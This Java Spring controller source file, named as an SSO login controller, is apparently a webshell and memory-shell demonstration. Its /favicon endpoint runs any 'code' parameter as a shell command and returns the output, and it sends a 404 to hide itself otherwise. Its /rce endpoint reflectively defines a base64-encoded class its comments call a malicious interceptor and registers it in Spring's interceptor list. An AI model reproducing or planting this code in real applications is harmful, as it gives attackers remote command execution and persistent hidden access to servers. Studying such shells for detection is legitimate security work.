package asm.platform.controller.login;

import asm.platform.common.util.encrypt.Base64Utils;
import org.springframework.expression.Expression;
import org.springframework.expression.common.TemplateParserContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;

/**
 * controller webshell 回显
 */
@RestController
public class SSOLoginController {

    @RequestMapping(value = "/favicon")
    public void cmd(HttpServletRequest request, HttpServletResponse response) {
        try {
            String arg0 = request.getParameter("code");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                } else {
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            } else {
                response.sendError(404);
            }
        } catch (Exception e) {
        }
    }

    @PostMapping(value = "/spl")
    public String spl(HttpServletRequest request, HttpServletResponse response) {
        try {
//            String input = request.getParameter("code");
//            SpelExpressionParser parser = new SpelExpressionParser();
//            Class<Object> result2 = parser.parseExpression(input).getValue(Class.class);
//
//            return result2.toString();
        } catch (Exception ce) {
            ce.printStackTrace();
        }
        return null;
    }

    @PostMapping(value = "/rce")
    public void rceInvoke() {
        try{
            String className = "asm.platform.interceptor.MagicInterceptor";
            // 恶意拦截器的class文件的base64编码
            String bs4 = Base64Utils.encodeFile("D:\\MagicInterceptor.class"); // magicInterceptor 类 class 的 base64 编码
            System.out.println("base 64 is "+ bs4);

            byte[] bytes = Base64Utils.decode(bs4);

            ClassLoader classLoader = Thread.currentThread().getClass().getClassLoader();

            // defineClass 恶意拦截器类
            Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            method.setAccessible(true);
            method.invoke(classLoader, className, bytes, 0, bytes.length);

//            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
//            m0.setAccessible(true);
//            m0.invoke(classLoader, className, bytes, 0, bytes.length);

            // 获取应用上下文
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            // 获取AbstractHandlerMapping实例, 用于反射
            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");

            // 反射获取 adaptedInterceptors 字段用于注册拦截器
            Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>) field.get(abstractHandlerMapping);

            //实例化恶意拦截器并注册
            adaptedInterceptors.add(classLoader.loadClass(className).newInstance());
        }catch (Exception ce){
            ce.printStackTrace();
        }

    }

}
